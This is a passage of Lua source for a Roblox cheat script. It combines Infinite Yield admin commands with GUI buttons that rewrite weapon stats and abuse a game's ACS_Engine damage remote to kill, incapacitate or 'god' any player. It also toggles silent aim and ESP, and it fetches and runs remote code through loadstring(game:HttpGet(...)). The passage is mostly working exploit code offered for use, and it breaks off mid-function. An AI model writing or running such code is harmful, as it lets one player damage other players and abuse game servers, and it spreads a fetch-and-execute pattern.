			else
				nameBox.Visible = false
				nbSelection.Parent = nil
				nbSelection.Adornee = nil
			end
		end
		nbUpdateFunc = IYMouse.Move:Connect(updateNameBox)
	end)

	addcmd('unhovername',{'nohovername'},function(args, speaker)
		if nbUpdateFunc then
			nbUpdateFunc:Disconnect()
			nameBox:Destroy()
			nbSelection:Destroy()
		end
	end)

	addcmd('hitbox',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if Players[v]~= speaker and Players[v].Character:FindFirstChild('Head') then
				local sizeArg = tonumber(args[2])
				local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
				local Head = Players[v].Character:FindFirstChild('Head')
				if Head:IsA("BasePart") then
					if not args[2] or sizeArg == 1 then
						Head.Size = Vector3.new(2,1,1)
					else
						Head.Size = Size
					end
				end
			end
		end
	end)

	addcmd('stareat',{'stare'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if stareLoop then
				stareLoop:Disconnect()
			end
			if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Players[v].Character:FindFirstChild("HumanoidRootPart") then return end
			local function stareFunc()
				if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(v) and Players[v].Character ~= nil and Players[v].Character:FindFirstChild("HumanoidRootPart") then
					local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
					local tPos=Players[v].Character:FindFirstChild("HumanoidRootPart").Position
					local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
					local newCF=CFrame.new(chrPos,modTPos)
					Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
				elseif not Players:FindFirstChild(v) then
					stareLoop:Disconnect()
				end
			end

			stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
		end
	end)

	addcmd('unstareat',{'unstare','nostare','nostareat'},function(args, speaker)
		if stareLoop then
			stareLoop:Disconnect()
		end
	end)

	addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
		workspace:FindFirstChildOfClass('Terrain'):Clear()
	end)

	addcmd('clearnilinstances',{'nonilinstances','cni'},function(args, speaker)
		if getnilinstances then
			for i,v in pairs(getnilinstances()) do
				v:Destroy()
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing getnilinstances)')
		end
	end)

	addcmd('destroyheight',{'dh'},function(args, speaker)
		local dh = args[1] or -500
		if isNumber(dh) then
			workspace.FallenPartsDestroyHeight = dh
		end
	end)

	local freezingua = nil
	frozenParts = {}
	addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
		if sethidden then
			local badnames = {
				"Head",
				"UpperTorso",
				"LowerTorso",
				"RightUpperArm",
				"LeftUpperArm",
				"RightLowerArm",
				"LeftLowerArm",
				"RightHand",
				"LeftHand",
				"RightUpperLeg",
				"LeftUpperLeg",
				"RightLowerLeg",
				"LeftLowerLeg",
				"RightFoot",
				"LeftFoot",
				"Torso",
				"Right Arm",
				"Left Arm",
				"Right Leg",
				"Left Leg",
				"HumanoidRootPart"
			}
			local function FREEZENOOB(v)
				if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
					local BADD = false
					for i = 1,#badnames do
						if v.Name == badnames[i] then
							BADD = true
						end
					end
					if speaker.Character and v:IsDescendantOf(speaker.Character) then
						BADD = true
					end
					if BADD == false then
						for i,c in pairs(v:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						if not simRadius then
							execCmd('simulationradius')
						end
						local bodypos = Instance.new("BodyPosition")
						bodypos.Parent = v
						bodypos.Position = v.Position
						bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
						local bodygyro = Instance.new("BodyGyro")
						bodygyro.Parent = v
						bodygyro.CFrame = v.CFrame
						bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
						if not table.find(frozenParts,v) then
							table.insert(frozenParts,v)
						end
					end
				end
			end
			for i,v in pairs(workspace:GetDescendants()) do
				FREEZENOOB(v)
			end
			freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
		if sethidden then
			if freezingua then
				freezingua:Disconnect()
			end
			if not simRadius then
				execCmd('simulationradius')
			end
			for i,v in pairs(frozenParts) do
				for i,c in pairs(v:GetChildren()) do
					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
						c:Destroy()
					end
				end
			end
			frozenParts = {}
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('tpunanchored',{'tpua'},function(args, speaker)
		if sethidden then
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local Forces = {}
				for _,part in pairs(workspace:GetDescendants()) do
					if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
						for i,c in pairs(part:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local ForceInstance = Instance.new("BodyPosition")
						ForceInstance.Parent = part
						ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						table.insert(Forces, ForceInstance)
						if not table.find(frozenParts,part) then
							table.insert(frozenParts,part)
						end
					end
				end
				if not simRadius then
					execCmd('simulationradius')
				end
				for i,c in pairs(Forces) do
					c.Position = Players[v].Character.Head.Position
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	keycodeMap = {
		["0"] = 0x30,
		["1"] = 0x31,
		["2"] = 0x32,
		["3"] = 0x33,
		["4"] = 0x34,
		["5"] = 0x35,
		["6"] = 0x36,
		["7"] = 0x37,
		["8"] = 0x38,
		["9"] = 0x39,
		["a"] = 0x41,
		["b"] = 0x42,
		["c"] = 0x43,
		["d"] = 0x44,
		["e"] = 0x45,
		["f"] = 0x46,
		["g"] = 0x47,
		["h"] = 0x48,
		["i"] = 0x49,
		["j"] = 0x4A,
		["k"] = 0x4B,
		["l"] = 0x4C,
		["m"] = 0x4D,
		["n"] = 0x4E,
		["o"] = 0x4F,
		["p"] = 0x50,
		["q"] = 0x51,
		["r"] = 0x52,
		["s"] = 0x53,
		["t"] = 0x54,
		["u"] = 0x55,
		["v"] = 0x56,
		["w"] = 0x57,
		["x"] = 0x58,
		["y"] = 0x59,
		["z"] = 0x5A,
		["enter"] = 0x0D,
		["shift"] = 0x10,
		["ctrl"] = 0x11,
		["alt"] = 0x12,
		["pause"] = 0x13,
		["capslock"] = 0x14,
		["spacebar"] = 0x20,
		["pageup"] = 0x21,
		["pagedown"] = 0x22,
		["end"] = 0x23,
		["home"] = 0x24,
		["left"] = 0x25,
		["up"] = 0x26,
		["right"] = 0x27,
		["down"] = 0x28,
		["insert"] = 0x2D,
		["delete"] = 0x2E,
		["f1"] = 0x70,
		["f2"] = 0x71,
		["f3"] = 0x72,
		["f4"] = 0x73,
		["f5"] = 0x74,
		["f6"] = 0x75,
		["f7"] = 0x76,
		["f8"] = 0x77,
		["f9"] = 0x78,
		["f10"] = 0x79,
		["f11"] = 0x7A,
		["f12"] = 0x7B,
	}
	autoKeyPressing = false
	cancelAutoKeyPress = nil

	addcmd('autokeypress',{'keypress'},function(args, speaker)
		if keypress and keyrelease and args[1] then
			local code = keycodeMap[args[1]:lower()]
			if not code then notify('Auto Key Press',"Invalid key") return end
			execCmd('unautokeypress')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[2] and isNumber(args[2]) then clickDelay = args[2] end
			if args[3] and isNumber(args[3]) then releaseDelay = args[3] end
			autoKeyPressing = true
			cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoKeyPressing = false
						cancelAutoKeyPress:Disconnect()
					end
				end
			end)
			notify('Auto Key Press',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				keypress(code)
				wait(releaseDelay)
				keyrelease(code)
			until autoKeyPressing == false
			if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() keyrelease(code) end
		else
			notify('Auto Key Press',"Your exploit doesn't have the ability to use auto key press")
		end
	end)

	addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
		autoKeyPressing = false
		if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() end
	end)

	addcmd('addplugin',{'plugin'},function(args, speaker)
		addPlugin(getstring(1))
	end)

	addcmd('removeplugin',{'deleteplugin'},function(args, speaker)
		deletePlugin(getstring(1))
	end)

	addcmd('reloadplugin',{},function(args, speaker)
		local pluginName = getstring(1)
		deletePlugin(pluginName)
		wait(1)
		addPlugin(pluginName)
	end)

	addcmd('removecmd',{'deletecmd'},function(args, speaker)
		removecmd(args[1])
	end)

	updateColors(currentShade1,shade1)
	updateColors(currentShade2,shade2)
	updateColors(currentShade3,shade3)
	updateColors(currentText1,text1)
	updateColors(currentText2,text2)
	updateColors(currentScroll,scroll)

	if PluginsTable ~= nil or PluginsTable ~= {} then
		FindPlugins(PluginsTable)
	end

	-- Events
	eventEditor.RegisterEvent("OnExecute")
	eventEditor.RegisterEvent("OnSpawn",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDied",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDamage",{
		{Type="Player",Name="Player Filter ($1)"},
		{Type="Number",Name="Below Health ($2)"}
	})
	eventEditor.RegisterEvent("OnKilled",{
		{Type="Player",Name="Victim Player ($1)"},
		{Type="Player",Name="Killer Player ($2)",Default = 1}
	})
	eventEditor.RegisterEvent("OnJoin",{
		{Type="Player",Name="Player Filter ($1)",Default = 1}
	})
	eventEditor.RegisterEvent("OnChatted",{
		{Type="Player",Name="Player Filter ($1)",Default = 1},
		{Type="String",Name="Message Filter ($2)"}
	})

	function hookCharEvents(plr,instant)
		spawn(function()
			local char = plr.Character
			if not char then return end

			local humanoid = char:WaitForChild("Humanoid",10)
			if not humanoid then return end

			local oldHealth = humanoid.Health
			humanoid.HealthChanged:Connect(function(health)
				local change = math.abs(oldHealth - health)
				if oldHealth > health then
					eventEditor.FireEvent("OnDamage",plr.Name,tonumber(health))
				end
				oldHealth = health
			end)

			humanoid.Died:Connect(function()
				eventEditor.FireEvent("OnDied",plr.Name)

				local killedBy = humanoid:FindFirstChild("creator")
				if killedBy and killedBy.Value and killedBy.Value.Parent then
					eventEditor.FireEvent("OnKilled",plr.Name,killedBy.Name)
				end
			end)
		end)
	end

	Players.PlayerAdded:Connect(function(plr)
		eventEditor.FireEvent("OnJoin",plr.Name)
		plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
		plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
		JoinLog(plr)
		ChatLog(plr)
		if ESPenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			ESP(plr)
		end
		if CHMSenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			CHMS(plr)
		end
	end)

	for _,plr in pairs(Players:GetPlayers()) do
		pcall(function()
			plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
			plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
			hookCharEvents(plr)
		end)
	end

	if spawnCmds and #spawnCmds > 0 then
		for i,v in pairs(spawnCmds) do
			eventEditor.AddCmd("OnSpawn",{v.COMMAND or "",{0},v.DELAY or 0})
		end
		updatesaves()
	end

	if loadedEventData then eventEditor.LoadData(loadedEventData) end
	eventEditor.Refresh()

	eventEditor.FireEvent("OnExecute")

	if aliases and #aliases > 0 then
		local cmdMap = {}
		for i,v in pairs(cmds) do
			cmdMap[v.NAME:lower()] = v
			for _,alias in pairs(v.ALIAS) do
				cmdMap[alias:lower()] = v
			end
		end
		for i = 1, #aliases do
			local cmd = string.lower(aliases[i].CMD)
			local alias = string.lower(aliases[i].ALIAS)
			if cmdMap[cmd] then
				customAlias[alias] = cmdMap[cmd]
			end
		end
		refreshaliases()
	end

	IYMouse.Move:Connect(checkTT)

	spawn(function()
		if pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version'))() end) then
			if ver ~= Version then
				notify('Outdated','Get the new version at infyield.yolasite.com')
			end
			if Announcement and Announcement ~= '' then
				local AnnGUI = Instance.new("Frame")
				local background = Instance.new("Frame")
				local TextBox = Instance.new("TextLabel")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("TextButton")
				local ExitImage = Instance.new("ImageLabel")

				AnnGUI.Name = randomString()
				AnnGUI.Parent = PARENT
				AnnGUI.Active = true
				AnnGUI.BackgroundTransparency = 1
				AnnGUI.Position = UDim2.new(0.5, -180, 0, -500)
				AnnGUI.Size = UDim2.new(0, 360, 0, 20)
				AnnGUI.ZIndex = 10

				background.Name = "background"
				background.Parent = AnnGUI
				background.Active = true
				background.BackgroundColor3 = currentShade1
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 150)
				background.ZIndex = 10

				TextBox.Parent = background
				TextBox.BackgroundTransparency = 1
				TextBox.Position = UDim2.new(0, 5, 0, 5)
				TextBox.Size = UDim2.new(0, 350, 0, 140)
				TextBox.Font = Enum.Font.SourceSans
				TextBox.TextSize = 18
				TextBox.TextWrapped = true
				TextBox.Text = Announcement
				TextBox.TextColor3 = currentText1
				TextBox.TextXAlignment = Enum.TextXAlignment.Left
				TextBox.TextYAlignment = Enum.TextYAlignment.Top
				TextBox.ZIndex = 10

				shadow.Name = "shadow"
				shadow.Parent = AnnGUI
				shadow.BackgroundColor3 = currentShade2
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 10

				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Size = UDim2.new(1, 0, 0.95, 0)
				PopupText.ZIndex = 10
				PopupText.Font = Enum.Font.SourceSans
				PopupText.TextSize = 14
				PopupText.Text = "Server Announcement"
				PopupText.TextColor3 = currentText1
				PopupText.TextWrapped = true

				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundTransparency = 1
				Exit.Position = UDim2.new(1, -20, 0, 0)
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.Text = ""
				Exit.ZIndex = 10

				ExitImage.Parent = Exit
				ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
				ExitImage.BackgroundTransparency = 1
				ExitImage.Position = UDim2.new(0, 5, 0, 5)
				ExitImage.Size = UDim2.new(0, 10, 0, 10)
				ExitImage.Image = "rbxassetid://5054663650"
				ExitImage.ZIndex = 10

				wait(1)
				AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)

				Exit.MouseButton1Click:Connect(function()
					AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
					wait(0.6)
					AnnGUI:Destroy()
				end)
			end
		end
	end)

	wait()
	Credits:TweenPosition(UDim2.new(0,0,0.9,0), "Out", "Quart", 0.2)
	Logo:TweenSizeAndPosition(UDim2.new(0,175,0,175),UDim2.new(0,37,0,45), "Out", "Quart", 0.3)
	wait(1)
	for i=0,1,0.1 do
		Logo.ImageTransparency = i
		IntroBackground.BackgroundTransparency = i
		wait()
	end
	Credits:TweenPosition(UDim2.new(0,0,0.9,30), "Out", "Quart", 0.2)
	wait(0.2)
	Logo:Destroy()
	Credits:Destroy()
	IntroBackground:Destroy()
	minimizeHolder()
end)

BalasExplosivas.Name = "BalasExplosivas"
BalasExplosivas.Parent = MAINGUI
BalasExplosivas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BalasExplosivas.Position = UDim2.new(0.367058814, 0, 0.221739098, 0)
BalasExplosivas.Size = UDim2.new(0, 113, 0, 42)
BalasExplosivas.Font = Enum.Font.SourceSans
BalasExplosivas.Text = "BulletBoom"
BalasExplosivas.TextColor3 = Color3.fromRGB(0, 0, 0)
BalasExplosivas.TextSize = 20.000
BalasExplosivas.MouseButton1Down:connect(function()
	local bomb = require(game.Players.LocalPlayer.Backpack["M1911"].ACS_Modulo.Variaveis.Settings)
	bomb["FireRate"] = 10000
	bomb["BSpeed"] = 5000
	bomb["BDrop"] = 0
	game.Players.LocalPlayer.Backpack["M1911"].ACS_Modulo.Variaveis.Ammo.Value = math.huge
	bomb["ExplosiveHit"] = true
	bomb["FireModes"].Auto = true
	bomb["ExPressure"] = 99999
	bomb["DestroyJointRadiusPercent"] = 99999
	bomb["ExRadius"] = 99999
	bomb["Distance"] = math.huge
	bomb["BulletLight"] = true
	bomb["BulletLightBrightness"] = math.huge
	bomb["BulletLightRange"] = math.huge
	bomb["GunSize"] = 10
	bomb["RainbowMode"] = true
end)

TextLabel_2.Parent = BalasExplosivas
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.0796460211, 0, 0.428571433, 0)
TextLabel_2.Size = UDim2.new(0, 122, 0, 32)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "(M1911)"
TextLabel_2.TextColor3 = Color3.fromRGB(179, 17, 17)
TextLabel_2.TextSize = 15.000

fbigov.Name = "fbi.gov"
fbigov.Parent = MAINGUI
fbigov.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fbigov.Position = UDim2.new(0.367058814, 0, 0.460869551, 0)
fbigov.Size = UDim2.new(0, 113, 0, 42)
fbigov.Font = Enum.Font.SourceSans
fbigov.Text = "FbiGov"
fbigov.TextColor3 = Color3.fromRGB(0, 0, 0)
fbigov.TextSize = 20.000
fbigov.MouseButton1Down:connect(function()
	game:GetObjects("rbxassetid://8410767707")[1].Parent=game.CoreGui
	local plr = game.Players.LocalPlayer
	local core = game.CoreGui:FindFirstChild("fbi.gov")
	local plrs = game:GetService("Players")

	directremove = function(tbl, val)
		for i, v in ipairs(tbl) do
			if v == val then
				return table.remove(tbl, i)
			end
		end
	end

	repeat wait() until game:IsLoaded()



	local function  killall()
		local pname = game.Players.LocalPlayer.Name
		for i, player in pairs(plrs:GetPlayers()) do
			local tbl_main =
				{
					game:GetService("Workspace")[player.Name].Humanoid,
					math.huge,
					0,
					0
				}
			game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
		end
	end


	local function  kill(plr)
		local tbl_main =
			{
				game:GetService("Workspace")[plr.Name].Humanoid,
				math.huge,
				0,
				0
			}
		game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
	end

	local function  Whizz(plr)

		game.ReplicatedStorage.ACS_Engine.Eventos.Whizz:FireServer(plr)
	end

	local function  WhizzAll()
		local pname = game.Players.LocalPlayer.Name
		for i, player in pairs(plrs:GetPlayers()) do
			game.ReplicatedStorage.ACS_Engine.Eventos.Whizz:FireServer(player)		
		end
	end


	local function  Hugehealth(plr)
		local tbl_main =
			{
				game:GetService("Workspace")[plr.Name].Humanoid,
				-999999999,
				0,
				0
			}
		game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
	end

	local function  to(plr)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(plr.Character.HumanoidRootPart.Position);
	end

	local function  god(plr)
		local tbl_main =
			{
				game:GetService("Workspace")[plr.Name].Humanoid,
				-math.huge,
				0,
				0
			}
		game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
	end


	local function  Incapacitate(plr)
		local tbl_main =
			{
				game:GetService("Workspace")[plr.Name].Humanoid,
				99,
				0,
				0
			}
		game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
	end

	local function  IncapacitateAll()
		local pname = game.Players.LocalPlayer.Name
		for i, player in pairs(plrs:GetPlayers()) do
			local tbl_main =
				{
					game:GetService("Workspace")[player.Name].Humanoid,
					99,
					0,
					0
				}
			game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage:FireServer(unpack(tbl_main))
		end
	end

	local function  suppress(plr)
		game.ReplicatedStorage.ACS_Engine.Eventos.Suppression:FireServer(plr)
	end


	local function  suppressall()
		local pname = game.Players.LocalPlayer.Name
		for i, player in pairs(plrs:GetPlayers()) do
			game.ReplicatedStorage.ACS_Engine.Eventos.Suppression:FireServer(player)
		end
	end

	local function  setselected(weapon)
		core.Main.Root.RootMain.Modifiers.SelectedWeapon.Value = tostring(weapon)
	end

	local function  setselectedplr(plr)
		core.Main.Root.RootMain.Players.SelectedPlayer.Value = tostring(plr)
	end

	local function  getselected()
		return plr.Backpack[core.Main.Root.RootMain.Modifiers.SelectedWeapon.Value]
	end

	local function  getselectedplr()
		return game.Players[core.Main.Root.RootMain.Players.SelectedPlayer.Value]
	end

	for i , v  in pairs(plr.Backpack:GetChildren()) do
		if v:FindFirstChild("ACS_Modulo") then
			local new = core.Main.Root.RootMain.Templates.Template:Clone()
			new.Visible = true
			new.Parent = core.Main.Root.RootMain.Modifiers.Holder
			new.Text = v.Name
			new.Name = v.Name
			new.MouseButton1Click:Connect(function()
				setselected(new.Text)
			end)
		end
	end

	plr.Backpack.DescendantAdded:Connect(function(v)
		if v:FindFirstChild("ACS_Modulo") then
			local new = core.Main.Root.RootMain.Templates.Template:Clone()
			new.Visible = true
			new.Parent = core.Main.Root.RootMain.Modifiers.Holder
			new.Text = v.Name
			new.Name = v.Name
			new.MouseButton1Click:Connect(function()
				setselected(new.Text)
			end)
		end
	end)

	plr.Backpack.DescendantRemoving:Connect(function(v)
		if v:FindFirstChild("ACS_Modulo") then
			local button = core.Main.Root.RootMain.Modifiers.Holder:FindFirstChild(v.Name)
			button:Destroy()
		end
	end)


	for i , v  in pairs(game.Players:GetChildren()) do
		local new = core.Main.Root.RootMain.Templates.Template:Clone()
		new.Visible = true
		new.Parent = core.Main.Root.RootMain.Players.Holder
		new.Text = v.Name .. " - " .. v.UserId
		new.Name = v.Name
		new.MouseButton1Click:Connect(function()
			setselectedplr(new.Name)
		end)
	end


	if game:FindFirstChild("Teams") then
		for i , v  in pairs(game.Teams:GetChildren()) do
			local new = core.Main.Root.RootMain.Templates.TemplateSmaller:Clone()
			new.Visible = true
			new.Parent = core.Main.Root.RootMain.Aim2.Holder
			new.Text = v.Name
			new.Name = v.Name
			new.MouseButton1Click:Connect(function()
				new.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
				directremove(_G.AimHacks["BlacklistedTeams"], new.Text)
			end)
			new.MouseButton2Click:Connect(function()
				new.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
				table.insert(_G.AimHacks["BlacklistedTeams"], new.Text)
			end)
		end
	end

	plrs.PlayerAdded:Connect(function(v)
		local new = core.Main.Root.RootMain.Templates.Template:Clone()
		new.Visible = true
		new.Parent = core.Main.Root.RootMain.Players.Holder
		new.Text = v.Name .. " - " .. v.UserId
		new.Name = v.Name
		new.MouseButton1Click:Connect(function()
			setselectedplr(new.Name)
		end)
	end)

	plrs.PlayerRemoving:Connect(function(v)
		local button = core.Main.Root.RootMain.Players.Holder:FindFirstChild(v)
		button:Destroy()
	end)

	for i , v  in pairs(core.Main.Root.TopBar:GetChildren()) do
		if v:IsA("TextButton") then
			v.MouseButton1Click:Connect(function()
				local tab = core.Main.Root.RootMain:FindFirstChild(v.Name)
				tab.Visible = true
				for x , c in pairs(core.Main.Root.RootMain:GetChildren()) do
					if string.find(c.Name, tab.Name) and c:IsA("Frame") then
						c.Visible = true
					else
						if c:IsA("Frame") then
							c.Visible = false						
						end
					end
				end
			end)
		end
	end

	core.Main.Root.RootMain.Players.SelectedPlayer.Changed:Connect(function(newuser)
		for h, j in pairs(core.Main.Root.RootMain.Players.Holder:GetChildren()) do
			if j.Name == newuser and j:IsA("TextButton") then
				j.BackgroundColor3 = Color3.fromRGB(57,57,57)
			else
				if j:IsA("TextButton") then
					j.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
				end
			end
		end
	end)

	core.Main.Root.RootMain.Modifiers.SelectedWeapon.Changed:Connect(function(newuser)
		for h, j in pairs(core.Main.Root.RootMain.Modifiers.Holder:GetChildren()) do
			if j.Name == newuser and j:IsA("TextButton") then
				j.BackgroundColor3 = Color3.fromRGB(57,57,57)
			else
				if j:IsA("TextButton") then
					j.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
				end
			end
		end
	end)


	local optionsPlayer = core.Main.Root.RootMain.Players2


	optionsPlayer.Goto.MouseButton1Click:Connect(function()
		to(getselectedplr())
	end)

	optionsPlayer.Kill.MouseButton1Click:Connect(function()
		kill(getselectedplr())
	end)

	optionsPlayer["Kill All"].MouseButton1Click:Connect(function()
		killall()
	end)

	optionsPlayer.Incapacitate.MouseButton1Click:Connect(function()
		Incapacitate(getselectedplr())
	end)

	optionsPlayer["Incapacitate All"].MouseButton1Click:Connect(function()
		IncapacitateAll()
	end)
	optionsPlayer["Huge Health"].MouseButton1Click:Connect(function()
		Hugehealth(getselectedplr())
	end)

	optionsPlayer["God"].MouseButton1Click:Connect(function()
		god(getselectedplr())
	end)

	optionsPlayer["Bullet Whizz Sound"].MouseButton1Click:Connect(function()
		Whizz(getselectedplr())
	end)
	optionsPlayer.Suppress.MouseButton1Click:Connect(function()
		suppress(getselectedplr())
	end)

	optionsPlayer["Bullet Whizz Sound All"].MouseButton1Click:Connect(function()
		WhizzAll()
	end)
	optionsPlayer.SuppressAll.MouseButton1Click:Connect(function()
		suppressall()
	end)




	local optionsVisual = core.Main.Root.RootMain.Visuals

	optionsVisual.Boxes.MouseButton1Click:Connect(function()
		optionsVisual.Boxes.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.Boxes = true
	end)

	optionsVisual.Boxes.MouseButton2Click:Connect(function()
		optionsVisual.Boxes.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.Boxes = false
	end)

	optionsVisual.Tracers.MouseButton1Click:Connect(function()
		optionsVisual.Tracers.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.Tracers = true
	end)

	optionsVisual.Tracers.MouseButton2Click:Connect(function()
		optionsVisual.Tracers.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.Tracers = false
	end)

	optionsVisual.ShowTeam.MouseButton1Click:Connect(function()
		optionsVisual.ShowTeam.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.ShowTeam = true
	end)

	optionsVisual.ShowTeam.MouseButton2Click:Connect(function()
		optionsVisual.ShowTeam.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.ShowTeam = false
	end)

	optionsVisual.CrosshairEnabled.MouseButton1Click:Connect(function()
		optionsVisual.CrosshairEnabled.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.CrosshairEnabled = true
	end)

	optionsVisual.CrosshairEnabled.MouseButton2Click:Connect(function()
		optionsVisual.CrosshairEnabled.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.CrosshairEnabled = false
	end)

	optionsVisual.Enabled.MouseButton1Click:Connect(function()
		optionsVisual.Enabled.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.Enabled = true
	end)

	optionsVisual.Enabled.MouseButton2Click:Connect(function()
		optionsVisual.Enabled.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.Enabled = false
	end)


	local optionsAim = core.Main.Root.RootMain.Aim

	optionsAim.Enabled.MouseButton1Click:Connect(function()
		optionsAim.Enabled.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.AimHacks.SilentAimEnabled = true
	end)

	optionsAim.Enabled.MouseButton2Click:Connect(function()
		optionsAim.Enabled.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.AimHacks.SilentAimEnabled = false
	end)

	optionsAim.VisualFOV.MouseButton1Click:Connect(function()
		optionsAim.VisualFOV.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.AimHacks.ShowFOV = true
	end)

	optionsAim.VisualFOV.MouseButton2Click:Connect(function()
		optionsAim.VisualFOV.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.AimHacks.ShowFOV = false
	end)

	optionsAim.TeamCheck.MouseButton1Click:Connect(function()
		optionsAim.TeamCheck.BackgroundColor3 = Color3.fromRGB(33, 52, 23)
		shared.AimHacks.TeamCheck = true
	end)

	optionsAim.TeamCheck.MouseButton2Click:Connect(function()
		optionsAim.TeamCheck.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
		shared.AimHacks.TeamCheck = false
	end)

	optionsAim.FOV.FocusLost:Connect(function(enterPressed, input)
		if enterPressed then
			shared.AimHacks.FOV = optionsAim.FOV.Text
		end
	end)

	optionsAim.HitChance.FocusLost:Connect(function(enterPressed, input)
		if enterPressed then
			shared.AimHacks.HitChance = optionsAim.HitChance.Text
